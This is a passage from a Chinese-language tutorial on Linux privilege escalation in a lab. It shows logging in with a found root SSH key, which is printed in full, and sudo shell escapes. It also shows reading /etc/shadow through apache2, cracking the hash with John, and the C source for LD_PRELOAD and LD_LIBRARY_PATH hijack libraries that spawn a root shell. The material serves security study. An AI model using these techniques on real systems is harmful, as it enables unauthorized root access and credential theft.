      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 1 /.ssh/root_key </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151929543.png" alt="image-20210630151929543"></p>
<p>这是一个 SSH 私钥。文件的名称和所有者告诉我们密钥属于root用户：</p>

        <h3 id="注意"   >
          <a href="#注意" class="heading-link"><i class="fas fa-link"></i></a><a href="#注意" class="headerlink" title="注意"></a>注意</h3>
      <p>在我们尝试使用此密钥之前，让我们确认甚至允许通过 SSH 登录根：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep PermitRootLogin /etc/ssh/sshd_config </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630152045099.png" alt="image-20210630152045099"></p>

        <h3 id="5-将密钥复制到本地机器，并给予其正确的权限"   >
          <a href="#5-将密钥复制到本地机器，并给予其正确的权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-将密钥复制到本地机器，并给予其正确的权限" class="headerlink" title="5.将密钥复制到本地机器，并给予其正确的权限"></a>5.将密钥复制到本地机器，并给予其正确的权限</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630152738111.png" alt="image-20210630152738111"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm</span><br><span class="line">gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl</span><br><span class="line">p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo</span><br><span class="line">OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD</span><br><span class="line">eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET</span><br><span class="line">Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2</span><br><span class="line">NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ</span><br><span class="line">YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+</span><br><span class="line">5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el</span><br><span class="line">WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7</span><br><span class="line">VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7</span><br><span class="line">6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW</span><br><span class="line">1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K</span><br><span class="line">824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6</span><br><span class="line">Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc</span><br><span class="line">U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1</span><br><span class="line">Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi</span><br><span class="line">SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV</span><br><span class="line">d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im</span><br><span class="line">jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa</span><br><span class="line">871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok</span><br><span class="line">X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4</span><br><span class="line">CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN</span><br><span class="line">Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4</span><br><span class="line">LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 root_key 赋予权限</span><br></pre></td></tr></table></div></figure>


        <h3 id="6-使用将SSH的密钥登录root帐户："   >
          <a href="#6-使用将SSH的密钥登录root帐户：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用将SSH的密钥登录root帐户：" class="headerlink" title="6.使用将SSH的密钥登录root帐户："></a>6.使用将SSH的密钥登录root帐户：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i root_key root@192.168.175.228</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704102546394.png" alt="image-20210704102546394"></p>

        <h1 id="0x07-SUDO"   >
          <a href="#0x07-SUDO" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x07-SUDO" class="headerlink" title="0x07 SUDO"></a>0x07 SUDO</h1>
      
        <h2 id="前言-7"   >
          <a href="#前言-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2>
      <p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p>
<p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过<code>/etc/sudoersfile</code>文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。</p>

        <h2 id="相关的命令-1"   >
          <a href="#相关的命令-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关的命令-1" class="headerlink" title="相关的命令"></a>相关的命令</h2>
      <p>使用sudo运行程序：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &lt;program&gt;</span><br></pre></td></tr></table></div></figure>

<p>以特定用户的身份运行程序：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo –u &lt;username&gt; &lt;program&gt;	</span><br></pre></td></tr></table></div></figure>

<p>允许（且不允许）运行列出用户的程序：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></div></figure>

<p>到目前为止，用sudo最明显的特权升级是使用sudo，因为它是预期的！</p>
<p>通过使用交换用户<code>su</code>命令生成root</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></div></figure>

<p>其他方法<br>有些时候不允许执行 su 计划，则有许多其他方法可以升级特权：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line">sudo -i </span><br><span class="line">sudo /bin/bash </span><br><span class="line">sudo passwd</span><br></pre></td></tr></table></div></figure>

<p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p>

        <h2 id="外壳逃生序列"   >
          <a href="#外壳逃生序列" class="heading-link"><i class="fas fa-link"></i></a><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2>
      <p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >https://gtfobins.github.io</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="步骤"   >
          <a href="#步骤" class="heading-link"><i class="fas fa-link"></i></a><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2>
      
        <h3 id="1-列出允许用户运行的程序"   >
          <a href="#1-列出允许用户运行的程序" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-列出允许用户运行的程序" class="headerlink" title="1.列出允许用户运行的程序"></a>1.列出允许用户运行的程序</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630162439011.png" alt="image-20210630162439011"></p>

        <h3 id="2-对每个程序进行查表，要细心"   >
          <a href="#2-对每个程序进行查表，要细心" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-对每个程序进行查表，要细心" class="headerlink" title="2.对每个程序进行查表，要细心"></a>2.对每个程序进行查表，要细心</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >https://gtfobins.github.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。"   >
          <a href="#3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。" class="headerlink" title="3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。"></a>3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</h3>
      
        <h2 id="滥用预期功能"   >
          <a href="#滥用预期功能" class="heading-link"><i class="fas fa-link"></i></a><a href="#滥用预期功能" class="headerlink" title="滥用预期功能"></a>滥用预期功能</h2>
      <p>如果程序没有逃生序列，则仍可能使用它来升级权限。<br>如果我们能够读取root用户拥有的文件，我们也许能够提取有用的信息（例如密码、哈希斯、密钥）。<br>如果我们 可以写信给root拥有的文件，我们也许能够插入或修改信息。</p>

        <h3 id="实操-5"   >
          <a href="#实操-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-5" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-允许用户通过Sudo运行的程序："   >
          <a href="#1-允许用户通过Sudo运行的程序：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-允许用户通过Sudo运行的程序：" class="headerlink" title="1.允许用户通过Sudo运行的程序："></a>1.允许用户通过Sudo运行的程序：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630162439011.png" alt="image-20210630162439011"></p>

        <h4 id="2-apache2"   >
          <a href="#2-apache2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-apache2" class="headerlink" title="2.apache2"></a>2.apache2</h4>
      <p> 已知中：apache2没有任何已知的外壳逃逸 </p>
<p> 但是，在解析给定的配置文件时，会出错并打印任何它不理解的行 </p>

        <h4 id="3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件"   >
          <a href="#3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件" class="headerlink" title="3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件"></a>3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630163336520.png" alt="image-20210630163336520"></p>

        <h4 id="4-从文件中提取根用户的哈希。"   >
          <a href="#4-从文件中提取根用户的哈希。" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-从文件中提取根用户的哈希。" class="headerlink" title="4.从文件中提取根用户的哈希。"></a>4.从文件中提取根用户的哈希。</h4>
      
        <h4 id="5-将密码哈希保存在文件中："   >
          <a href="#5-将密码哈希保存在文件中：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-将密码哈希保存在文件中：" class="headerlink" title="5.将密码哈希保存在文件中："></a>5.将密码哈希保存在文件中：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0&#x27; &gt; hash.txt</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630163503549.png" alt="image-20210630163503549"></p>

        <h4 id="6-使用开膛手破解密码哈希："   >
          <a href="#6-使用开膛手破解密码哈希：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-使用开膛手破解密码哈希：" class="headerlink" title="6.使用开膛手破解密码哈希："></a>6.使用开膛手破解密码哈希：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141447898.png" alt="image-20210630141447898"></p>

        <h4 id="7-使用su-命令切换到root用户"   >
          <a href="#7-使用su-命令切换到root用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-使用su-命令切换到root用户" class="headerlink" title="7.使用su 命令切换到root用户"></a>7.使用su 命令切换到root用户</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630164008714.png" alt="image-20210630164008714"></p>

        <h3 id="环境变量"   >
          <a href="#环境变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3>
      <p>通过sudo运行的程序可以从用户的环境中继承环境变量。<br>在<code> /etc/sudoers</code>配置文件中，</p>
<p>如果设置<code>env_reset</code>选项，sudo 将在新的、最小的环境中运行程序。<br><code>env_keep</code>选项可用于防止某些环境变量远离用户的环境。<br><code>sudo -l</code>时显示配置的选项</p>

        <h4 id="LD-PRELOAD"   >
          <a href="#LD-PRELOAD" class="heading-link"><i class="fas fa-link"></i></a><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4>
      
        <h5 id="前言-8"   >
          <a href="#前言-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-8" class="headerlink" title="前言"></a>前言</h5>
      <p>LD_PRELOAD预加载 是一个环境变量，可以设置为共享对象 (.so)文件的路径。<br>设置时，共享对象将先于任何其他对象加载。<br>通过创建自定义共享对象并创建 init()功能，我们可以在加载 object 后立即执行代码。</p>

        <h5 id="局限性"   >
          <a href="#局限性" class="heading-link"><i class="fas fa-link"></i></a><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5>
      <p>如果真正的用户 ID与有效的用户 ID不同，则LD_PRELOAD将不起作用。<br>必须配置 sudo，以便使用<code>env_keep</code>选项来维护LD_PRELOAD环境变量。</p>

        <h5 id="实操-6"   >
          <a href="#实操-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-6" class="headerlink" title="实操"></a>实操</h5>
      
        <h5 id="1-列出允许用户运行的程序-1"   >
          <a href="#1-列出允许用户运行的程序-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-列出允许用户运行的程序-1" class="headerlink" title="1.列出允许用户运行的程序"></a>1.列出允许用户运行的程序</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704102838002.png" alt="image-20210704102838002"></p>
<p>注意：<code>env_keep</code>包括<code>LD_PRELOAD</code>环境变量</p>

        <h5 id="2-创建具有以下内容的文件-preload-c-："   >
          <a href="#2-创建具有以下内容的文件-preload-c-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-创建具有以下内容的文件-preload-c-：" class="headerlink" title="2.创建具有以下内容的文件(preload.c)："></a>2.创建具有以下内容的文件(preload.c)：</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103218382.png" alt="image-20210704103218382"></p>

        <h5 id="3-编译preload-c到preload-so："   >
          <a href="#3-编译preload-c到preload-so：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-编译preload-c到preload-so：" class="headerlink" title="3.编译preload.c到preload.so："></a>3.编译preload.c到preload.so：</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c</span><br></pre></td></tr></table></div></figure>




        <h5 id="4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径："   >
          <a href="#4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用sudo运行任何允许的程序，同时将LD-PRELOAD环境变量设置为preload-so文件的完整路径：" class="headerlink" title="4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径："></a>4.使用sudo运行任何允许的程序，同时将LD_PRELOAD环境变量设置为preload.so文件的完整路径：</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/tmp/preload.so apache2</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103256577.png" alt="image-20210704103256577"></p>

        <h4 id="LD-LIBRARY-PATH"   >
          <a href="#LD-LIBRARY-PATH" class="heading-link"><i class="fas fa-link"></i></a><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h4>
      
        <h4 id="前言-9"   >
          <a href="#前言-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-9" class="headerlink" title="前言"></a>前言</h4>
      <p>LD_LIBRARY_PATH环境变量包含一组目录，首先搜索共享库。<br>ldd 命令可用于打印程序使用的共享库：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/sbin/apache2</span><br></pre></td></tr></table></div></figure>



<p>通过创建与程序使用的同名共享库，并将LD_LIBRARY_PATH设置为其父目录，程序将转而加载我们的共享库。</p>

        <h4 id="实操-7"   >
          <a href="#实操-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-7" class="headerlink" title="实操"></a>实操</h4>
      
        <h5 id="1-运行ldd对apache2程序文件："   >
          <a href="#1-运行ldd对apache2程序文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-运行ldd对apache2程序文件：" class="headerlink" title="1.运行ldd对apache2程序文件："></a>1.运行ldd对apache2程序文件：</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/sbin/apache2</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103440965.png" alt="image-20210704103440965"></p>
<p>这个方法是进行劫持共享对象是命中或未命中的，从中选择一个列表并尝试它</p>

        <h5 id="2-创建具有以下内容的文件-library-path-c-："   >
          <a href="#2-创建具有以下内容的文件-library-path-c-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-创建具有以下内容的文件-library-path-c-：" class="headerlink" title="2.创建具有以下内容的文件(library_path.c)："></a>2.创建具有以下内容的文件(library_path.c)：</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hijack</span><span class="params">()</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hijack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_LIBRARY_PATH&quot;</span>);</span><br><span class="line">setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103702129.png" alt="image-20210704103702129"></p>

        <h5 id="3-将library-path-c-编译成libcrypt-so-1"   >
          <a href="#3-将library-path-c-编译成libcrypt-so-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-将library-path-c-编译成libcrypt-so-1" class="headerlink" title="3.将library_path.c 编译成libcrypt.so.1:"></a>3.将library_path.c 编译成libcrypt.so.1:</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o libcrypt.so.1 -shared -fPIC library_path.c</span><br></pre></td></tr></table></div></figure>




        <h5 id="4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）："   >
          <a href="#4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用-sudo运行-apache2，同时将LD-LIBRARY-PATH环境变量设置为当前路径（我们汇编library-path-c）：" class="headerlink" title="4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）："></a>4.使用 sudo运行 apache2，同时将LD_LIBRARY_PATH环境变量设置为当前路径（我们汇编library_path.c）：</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_LIBRARY_PATH=. apache2</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704103723147.png" alt="image-20210704103723147"></p>

        <h1 id="0x08-Cron-jobs"   >
          <a href="#0x08-Cron-jobs" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x08-Cron-jobs" class="headerlink" title="0x08 Cron jobs"></a>0x08 Cron jobs</h1>
      
        <h2 id="前言-10"   >
          <a href="#前言-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-10" class="headerlink" title="前言"></a>前言</h2>
      <p>Cron jobs是用户可以安排在特定时间或间隔运行的程序或脚本。<br>Cron jobs与拥有它们的用户的安全级别一起运行。<br>默认情况下，使用环境变量有限的<code>/bin/sh</code> shell</p>

        <h2 id="Cron-tables"   >
          <a href="#Cron-tables" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cron-tables" class="headerlink" title="Cron tables"></a>Cron tables</h2>
      <p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于<code>/var/spool/cron/</code> or <code>/var/spool/cron/crontabs/</code><br>system系统的crontab位于<code>/etc/crontab</code></p>

        <h2 id="文件权限-1"   >
          <a href="#文件权限-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件权限-1" class="headerlink" title="文件权限"></a>文件权限</h2>
      <p>与 Cron jobs关联的文件权限配置错误可能导致提权<br>如果我们可以编写到作为 cron jobs的一部分运行的程序或脚本，我们可以用我们自己的代码替换它。</p>

        <h2 id="实操-8"   >
          <a href="#实操-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-8" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="1-查看system-wide-crontab的内容："   >
          <a href="#1-查看system-wide-crontab的内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查看system-wide-crontab的内容：" class="headerlink" title="1.查看system-wide crontab的内容："></a>1.查看system-wide crontab的内容：</h3>
      <figure class="highlight plaintext"><figcaption><span>/etc/crontab</span></figcaption><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171256823.png" alt="image-20210630171256823"></p>

        <h3 id="2-在服务器上查找overwrite-sh-文件："   >
          <a href="#2-在服务器上查找overwrite-sh-文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-在服务器上查找overwrite-sh-文件：" class="headerlink" title="2.在服务器上查找overwrite.sh 文件："></a>2.在服务器上查找overwrite.sh 文件：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate overwrite.sh </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171347594.png" alt="image-20210630171347594"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/overwrite.sh</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-检查文件的权限"   >
          <a href="#3-检查文件的权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-检查文件的权限" class="headerlink" title="3.检查文件的权限"></a>3.检查文件的权限</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/local/bin/overwrite.sh</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171515478.png" alt="image-20210630171515478"></p>
<p>注意：这个文件是可写的</p>

        <h3 id="4-将-overwrite-sh文件的内容替换为："   >
